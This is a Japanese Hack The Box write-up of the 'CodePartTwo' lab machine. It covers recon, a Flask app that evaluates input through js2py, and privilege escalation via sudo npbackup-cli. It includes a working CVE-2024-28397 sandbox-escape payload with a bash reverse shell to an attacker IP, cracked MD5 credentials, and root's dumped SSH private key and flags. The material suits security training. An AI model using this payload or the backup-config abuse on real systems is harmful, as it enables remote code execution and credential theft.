# CodePartTwo

## 探索

### ポートスキャンnmap

```
┌──(kali㉿kali)-[~/htb/CodePartTwo]
└─$ nmap -sC -sV 10.129.232.59
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-10 01:18 EST
Nmap scan report for 10.129.232.59
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Welcome to CodePartTwo
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.83 seconds
```

Gunicorn + ポート8000 → Python（Flask / FastAPI / Django）の可能性が高い


サイトにアクセスする

http://10.129.232.59:8000

![alt text]({BC14EC46-09BB-4383-8A76-DB14F268DF1A}.png)


## ディレクトリ探索

```
┌──(kali㉿kali)-[~/htb/CodePartTwo]
└─$ ffuf -u http://10.129.232.59:8000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.232.59:8000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

dashboard               [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 186ms]
download                [Status: 200, Size: 10708, Words: 51, Lines: 48, Duration: 166ms]
login                   [Status: 200, Size: 667, Words: 119, Lines: 20, Duration: 201ms]
logout                  [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 191ms]
register                [Status: 200, Size: 651, Words: 117, Lines: 20, Duration: 198ms]
:: Progress: [4750/4750] :: Job [1/1] :: 73 req/sec :: Duration: [0:00:50] :: Errors: 0 ::
```

見つかったエンドポイント：

/register
/login
/dashboard（302）
/download（200）
/logout

👉 認証前提の Web アプリ
👉 /dashboard が 未ログインだとリダイレクト
👉 /download が 未ログインでも 200 ← ★要注意

## app.zipを取得

サイトのDownload appをクリックして、Zipをダウンロード

```
┌──(kali㉿kali)-[~/htb/CodePartTwo]
└─$ ls
app.zip
                                                                                                                                                                         
┌──(kali㉿kali)-[~/htb/CodePartTwo]
└─$ unzip app.zip 
Archive:  app.zip
   creating: app/
   creating: app/static/
   creating: app/static/css/
  inflating: app/static/css/styles.css  
   creating: app/static/js/
  inflating: app/static/js/script.js  
  inflating: app/app.py              
   creating: app/templates/
  inflating: app/templates/dashboard.html  
  inflating: app/templates/reviews.html  
  inflating: app/templates/index.html  
  inflating: app/templates/base.html  
  inflating: app/templates/register.html  
  inflating: app/templates/login.html  
  inflating: app/requirements.txt    
   creating: app/instance/
  inflating: app/instance/users.db
```


### ルーティングの調査

見るべき観点は固定です：
- ルーティング（@app.route）
- /download の実装
- render_template / render_template_string
- eval / exec
- ファイル操作（open, send_file, send_from_directory）
- SQLite (users.db) の扱い

```
┌──(kali㉿kali)-[~/htb/CodePartTwo]
└─$ sed -n '1,200p' app/app.py
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory
from flask_sqlalchemy import SQLAlchemy
import hashlib
import js2py
import os
import json

js2py.disable_pyimport()
app = Flask(__name__)
app.secret_key = 'S3cr3tK3yC0d3PartTw0'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(128), nullable=False)

class CodeSnippet(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    code = db.Column(db.Text, nullable=False)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/dashboard')
def dashboard():
    if 'user_id' in session:
        user_codes = CodeSnippet.query.filter_by(user_id=session['user_id']).all()
        return render_template('dashboard.html', codes=user_codes)
    return redirect(url_for('login'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        new_user = User(username=username, password_hash=password_hash)
        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        user = User.query.filter_by(username=username, password_hash=password_hash).first()
        if user:
            session['user_id'] = user.id
            session['username'] = username;
            return redirect(url_for('dashboard'))
        return "Invalid credentials"
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    return redirect(url_for('index'))

@app.route('/save_code', methods=['POST'])
def save_code():
    if 'user_id' in session:
        code = request.json.get('code')
        new_code = CodeSnippet(user_id=session['user_id'], code=code)
        db.session.add(new_code)
        db.session.commit()
        return jsonify({"message": "Code saved successfully"})
    return jsonify({"error": "User not logged in"}), 401

@app.route('/download')
def download():
    return send_from_directory(directory='/home/app/app/static/', path='app.zip', as_attachment=True)

@app.route('/delete_code/<int:code_id>', methods=['POST'])
def delete_code(code_id):
    if 'user_id' in session:
        code = CodeSnippet.query.get(code_id)
        if code and code.user_id == session['user_id']:
            db.session.delete(code)
            db.session.commit()
            return jsonify({"message": "Code deleted successfully"})
        return jsonify({"error": "Code not found"}), 404
    return jsonify({"error": "User not logged in"}), 401

@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', debug=True)
```

app.pyこのアプリケーションはデータベース操作にFlaskとSQLAlchemyを使用していることが判明しました。重大な脆弱性は/run_codeエンドポイントに存在します

なぜ脆弱か（構造理解）

```
@app.route('/run_code', methods=['POST'])
def run_code():
    code = request.json.get('code')
    result = js2py.eval_js(code)
```

- ユーザー入力が 無加工で eval
- js2py は Python オブジェクトに到達可能
- sandbox ではない（CTFあるある）

testuser / test123 でログイン


```
┌──(kali㉿kali)-[~/htb/CodePartTwo/app]
└─$ cat requirements.txt 
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```

**js2py version 0.74で検索**


![alt text]({D92831C6-A4A9-490D-8355-AC21478FADAE}.png)


CVE-2024-28397が見つかる

https://nvd.nist.gov/vuln/detail/CVE-2024-28397


### CVE-2024-28397

CVE-2024-28397 の要点まとめ
- 脆弱性の本質: Pythonで動くJavaScript実行環境「Js2Py」において、本来JavaScript側からPythonを操作できないようにする制限（disable_pyimport()）を突破できてしまう点にあります。

- 対象範囲: Js2Pyのバージョン 0.74までが対象です。

攻撃の影響:
JavaScriptの中から、本来は隔離されているはずのPython内部オブジェクトにアクセス可能になります。

そこからPythonモジュールを呼び出し、サーバー上のファイル削除や**OSコマンドの自由な実行（RCE）**が可能になります。


10.10.15.61


```
nc -lvnp 4444
```


### リバースシェルの確立

```
curl -X POST http://10.129.232.59:8000/run_code -H "Content-Type: application/json" -d @- << 'EOF'
{
  "code": "let cmd = \"bash -c 'bash -i >& /dev/tcp/10.10.15.61/4444 0>&1'\";\nlet hacked, bymarve, n11;\nlet getattr, obj;\nhacked = Object.getOwnPropertyNames({});\nbymarve = hacked.__getattribute__;\nn11 = bymarve(\"__getattribute__\");\nobj = n11(\"__class__\").__base__;\ngetattr = obj.__getattribute__;\nfunction findpopen(o) {\n    let result;\n    for (let i in o.__subclasses__()) {\n        let item = o.__subclasses__()[i];\n        if (item.__module__ == \"subprocess\" && item.__name__ == \"Popen\") {\n            return item;\n        }\n        if (item.__name__ != \"type\" && (result = findpopen(item))) {\n            return result;\n        }\n    }\n}\nfindpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();"
}
EOF
```

接続完了

```
──(kali㉿kali)-[~/htb/CodePartTwo]
└─$ nc -lvnp 4444

listening on [any] 4444 ...
connect to [10.10.15.61] from (UNKNOWN) [10.129.232.59] 45476
bash: cannot set terminal process group (937): Inappropriate ioctl for device
bash: no job control in this shell
app@codeparttwo:~/app$ whoami
whoami
app
app@codeparttwo:~/app$ hostname
hostname
codeparttwo
```


### DBの資格情報

```
app@codeparttwo:~/app$ sqlite3 instance/users.db
SQLite version 3.31.1 2020-01-27 19:55:54
sqlite> .tables
code_snippet  user
sqlite> SELECT * FROM user;
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
```

### ハッシュ解析

Crackstasionで以下のハッシュを解析
`649c9d65a206a75f5abe509fe128bce5`

解析すると以下のパスワードが判明する

`sweetangelbabylove`

marco
sweetangelbabylove

## 初期侵入

```
┌──(kali㉿kali)-[~/htb/CodePartTwo]
└─$ ssh marco@10.129.232.59   
The authenticity of host '10.129.232.59 (10.129.232.59)' can't be established.
ED25519 key fingerprint is: SHA256:KGKFyaW9Pm7DDxZe/A8oi/0hkygmBMA8Y33zxkEjcD4
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.232.59' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
marco@10.129.232.59's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 10 Feb 2026 07:13:20 AM UTC

  System load:           0.0
  Usage of /:            57.5% of 5.08GB
  Memory usage:          31%
  Swap usage:            0%
  Processes:             233
  Users logged in:       0
  IPv4 address for eth0: 10.129.232.59
  IPv6 address for eth0: dead:beef::250:56ff:feb0:bd9e


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Feb 10 07:13:22 2026 from 10.10.15.61
marco@codeparttwo:~$ whoami
marco
```

### user.txt

```
marco@codeparttwo:~$ ls
backups  npbackup.conf  user.txt
marco@codeparttwo:~$ cat user.txt 
bdc722c486bb172ce15e8c8d90126c29
```

`bdc722c486bb172ce15e8c8d90126c29`

## 内部探索

```
marco@codeparttwo:~$ id
uid=1000(marco) gid=1000(marco) groups=1000(marco),1003(backups)
```

- marco は backups グループ所属
- npbackup.conf が root 所有だが “group write 可能”

 HTB的には
「root が定期的にバックアップを走らせていて、設定ファイルを信頼し切っている」
典型構成です。

```
marco@codeparttwo:~$ ls -la
total 44
drwxr-x--- 6 marco marco 4096 Feb 10 07:15 .
drwxr-xr-x 4 root  root  4096 Jan  2  2025 ..
drwx------ 7 root  root  4096 Apr  6  2025 backups
lrwxrwxrwx 1 root  root     9 Oct 26  2024 .bash_history -> /dev/null
-rw-r--r-- 1 marco marco  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 marco marco 3771 Feb 25  2020 .bashrc
drwx------ 2 marco marco 4096 Apr  6  2025 .cache
drwxrwxr-x 4 marco marco 4096 Feb  1  2025 .local
lrwxrwxrwx 1 root  root     9 Nov 17  2024 .mysql_history -> /dev/null
-rw-rw-r-- 1 root  root  2893 Jun 18  2025 npbackup.conf
-rw-r--r-- 1 marco marco  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root  root     9 Oct 26  2024 .python_history -> /dev/null
lrwxrwxrwx 1 root  root     9 Oct 31  2024 .sqlite_history -> /dev/null
drwx------ 2 marco marco 4096 Oct 20  2024 .ssh
-rw-r----- 1 root  marco   33 Feb 10 06:16 user.txt
```


まず npbackup.conf を必ず確認
見るべきポイント：

- command =
- pre_command
- post_command
- hooks
- backup_cmd
- rsync, tar, mysqldump などの 外部コマンド

ここに任意コマンド実行余地があるかがポイント

```
groups:
  default_group:
    backup_opts:
      pre_exec_commands: []
      post_exec_commands: []
      post_exec_execute_even_on_backup_error: true
```

これは npbackup の設定ファイル汚染による root コマンド実行 が ほぼ確定

pre_exec_commands / post_exec_commands が配列で定義されており、かつ設定ファイルが group write
👉 root 実行のバックアップ時に、ここへ書いたコマンドがそのまま実行される

やることは1つだけ

post_exec_commands に root shell を作るコマンド を追加する。

### 悪意のあるバックアップ構成

任意の設定ファイルを指定してnpbackup-cliroot として実行できるため、以下をターゲットとする変更された設定を作成しました/root

```
marco@codeparttwo:~$ cp npbackup.conf /dev/shm/exploit.conf
marco@codeparttwo:~$ vim /dev/shm/exploit.conf
```

ルートのディレクトリを含めるようにパスセクションを変更しました。
```
backup_opts:
  paths:
  - /home/app/app/
  - /root/
```

バックアップを実行します。

```
marco@codeparttwo:~$ sudo npbackup-cli -c /dev/shm/exploit.conf -b
2026-02-10 07:24:43,949 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2026-02-10 07:24:43,982 :: INFO :: Loaded config 73199EB2 in /dev/shm/exploit.conf
2026-02-10 07:24:43,996 :: INFO :: Searching for a backup newer than 1 day, 0:00:00 ago
2026-02-10 07:24:46,643 :: INFO :: Snapshots listed successfully
2026-02-10 07:24:46,644 :: INFO :: No recent backup found in repo default. Newest is from 2025-04-06 03:50:16.222832+00:00
2026-02-10 07:24:46,644 :: INFO :: Runner took 2.648861 seconds for has_recent_snapshot
2026-02-10 07:24:46,645 :: INFO :: Running backup of ['/home/app/app/', '/root/'] to repo default
2026-02-10 07:24:47,816 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excluded_extensions
2026-02-10 07:24:47,817 :: ERROR :: Exclude file 'excludes/generic_excluded_extensions' not found
2026-02-10 07:24:47,817 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excludes
2026-02-10 07:24:47,817 :: ERROR :: Exclude file 'excludes/generic_excludes' not found
2026-02-10 07:24:47,817 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/windows_excludes
2026-02-10 07:24:47,817 :: ERROR :: Exclude file 'excludes/windows_excludes' not found
2026-02-10 07:24:47,818 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/linux_excludes
2026-02-10 07:24:47,818 :: ERROR :: Exclude file 'excludes/linux_excludes' not found
2026-02-10 07:24:47,818 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows
no parent snapshot found, will read all files

Files:          27 new,     0 changed,     0 unmodified
Dirs:           17 new,     0 changed,     0 unmodified
Added to the repository: 224.653 KiB (59.188 KiB stored)

processed 27 files, 246.625 KiB in 0:00
snapshot dd179162 saved
2026-02-10 07:24:49,183 :: INFO :: Backend finished with success
2026-02-10 07:24:49,186 :: INFO :: Processed 246.6 KiB of data
2026-02-10 07:24:49,186 :: ERROR :: Backup is smaller than configured minmium backup size
2026-02-10 07:24:49,186 :: ERROR :: Operation finished with failure
2026-02-10 07:24:49,187 :: INFO :: Runner took 5.194159 seconds for backup
2026-02-10 07:24:49,188 :: INFO :: Operation finished
2026-02-10 07:24:49,196 :: INFO :: ExecTime = 0:00:05.250406, finished, state is: errors.
marco@codeparttwo:~$ sudo npbackup-cli -c /dev/shm/exploit.conf --ls
2026-02-10 07:25:09,096 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2026-02-10 07:25:09,157 :: INFO :: Loaded config 73199EB2 in /dev/shm/exploit.conf
2026-02-10 07:25:09,173 :: INFO :: Showing content of snapshot latest in repo default
2026-02-10 07:25:11,659 :: INFO :: Successfully listed snapshot latest content:
snapshot dd179162 of [/home/app/app /root] at 2026-02-10 07:24:47.835053742 +0000 UTC by root@codeparttwo filtered by []:
/home
/home/app
/home/app/app
/home/app/app/__pycache__
/home/app/app/__pycache__/app.cpython-38.pyc
/home/app/app/app.py
/home/app/app/instance
/home/app/app/instance/users.db
/home/app/app/requirements.txt
/home/app/app/static
/home/app/app/static/app.zip
/home/app/app/static/css
/home/app/app/static/css/styles.css
/home/app/app/static/js
/home/app/app/static/js/script.js
/home/app/app/templates
/home/app/app/templates/base.html
/home/app/app/templates/dashboard.html
/home/app/app/templates/index.html
/home/app/app/templates/login.html
/home/app/app/templates/register.html
/root
/root/.bash_history
/root/.bashrc
/root/.cache
/root/.cache/motd.legal-displayed
/root/.local
/root/.local/share
/root/.local/share/nano
/root/.local/share/nano/search_history
/root/.mysql_history
/root/.profile
/root/.python_history
/root/.sqlite_history
/root/.ssh
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.vim
/root/.vim/.netrwhist
/root/root.txt
/root/scripts
/root/scripts/backup.tar.gz
/root/scripts/cleanup.sh
/root/scripts/cleanup_conf.sh
/root/scripts/cleanup_db.sh
/root/scripts/cleanup_marco.sh
/root/scripts/npbackup.conf
/root/scripts/users.db

2026-02-10 07:25:11,660 :: INFO :: Runner took 2.487496 seconds for ls
2026-02-10 07:25:11,660 :: INFO :: Operation finished
2026-02-10 07:25:11,673 :: INFO :: ExecTime = 0:00:02.581246, finished, state is: success.
```

- バックアップの内容を一覧表示すると、ルートのファイルが含まれていることが確認されました。


- フラグを使用して--dump、ルートの SSH 秘密キーを抽出。

```
marco@codeparttwo:~$ sudo npbackup-cli -c /dev/shm/exploit.conf --dump /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```


## 権限昇格

```
marco@codeparttwo:~$ chmod 600 root_key
marco@codeparttwo:~$ ls -l root_key
-rw------- 1 marco marco 2602 Feb 10 07:29 root_key
marco@codeparttwo:~$ ssh-keygen -lf root_key
3072 SHA256:zyDk+0TJQot7rVM+FbpsJHeDVsXdQj4fA14jWkLCDDQ root@codetwo (RSA)
marco@codeparttwo:~$ ssh -i root_key root@10.129.232.59
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 10 Feb 2026 07:30:27 AM UTC

  System load:           0.0
  Usage of /:            57.7% of 5.08GB
  Memory usage:          32%
  Swap usage:            0%
  Processes:             239
  Users logged in:       1
  IPv4 address for eth0: 10.129.232.59
  IPv6 address for eth0: dead:beef::250:56ff:feb0:bd9e


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Feb 10 07:30:27 2026 from 10.129.232.59
root@codeparttwo:~# whoami
root
root@codeparttwo:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### root.txt

```
root@codeparttwo:~# ls
root.txt  scripts
root@codeparttwo:~# cat root.txt 
7df6f98a8055b806be85a93e28dbf26d

```

`7df6f98a8055b806be85a93e28dbf26d`